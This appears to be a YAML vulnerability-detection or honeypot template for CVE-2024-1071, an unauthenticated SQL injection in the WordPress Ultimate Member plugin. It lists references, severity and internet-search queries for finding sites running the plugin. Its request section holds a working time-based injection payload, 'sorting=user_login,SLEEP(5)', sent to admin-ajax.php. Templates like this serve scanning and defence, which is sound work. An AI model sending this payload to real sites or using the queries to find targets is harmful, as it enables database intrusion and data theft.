id: CVE-2024-1071
info:
  name: WordPress Ultimate Member 2.1.3 - 2.8.2 – SQL Injection
  author: DhiyaneshDK,iamnooob
  description: 'The Ultimate Member - User Profile, Registration, Login, Member Directory,
    Content Restriction & Membership Plugin plugin for WordPress is vulnerable to
    SQL Injection via the ‘sorting’ parameter in versions 2.1.3 to 2.8.2 due to insufficient
    escaping on the user supplied parameter and lack of sufficient preparation on
    the existing SQL query. This makes it possible for unauthenticated attackers to
    append additional SQL queries into already existing queries that can be used to
    extract sensitive information from the database.

    '
  severity: critical
  remediation: Fixed in 2.8.3
  reference:
  - https://www.wordfence.com/blog/2024/02/2063-bounty-awarded-for-unauthenticated-sql-injection-vulnerability-patched-in-ultimate-member-wordpress-plugin/
  - https://securityonline.info/cve-2024-1071-wordpress-ultimate-member-plugin-under-active-attack/
  - https://plugins.trac.wordpress.org/browser/ultimate-member/tags/2.8.2/includes/core/class-member-directory-meta.php?rev=3022076
  - https://plugins.trac.wordpress.org/browser/ultimate-member/tags/2.8.2/includes/core/class-member-directory-meta.php?rev=3022076#L666
  - https://plugins.trac.wordpress.org/browser/ultimate-member/tags/2.8.2/includes/core/class-member-directory-meta.php?rev=3022076#L858
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-1071
    cwe-id: CWE-89
    epss-score: 0.00063
    epss-percentile: 0.24988
  metadata:
    verified: true
    max-request: 2
    framework: wordpress
    fofa-query: body="/wp-content/plugins/ultimate-member"
    publicwww-query: /wp-content/plugins/ultimate-member/
    zoomeye-query: app:"WordPress Ultimate Member Plugin"
  tags: cve,cve2024,ultimate-member,wpscan,wordpress,wp-plugin
traps:
- request:
    method: GET
    path: /?p=1
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: POST
    path: /wp-admin/admin-ajax.php?action=um_get_members
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: directory_id=b9238&sorting=user_login,SLEEP(5)&nonce={{nonce}}
  response:
    status_code: 200
    headers: {}
    body: ''
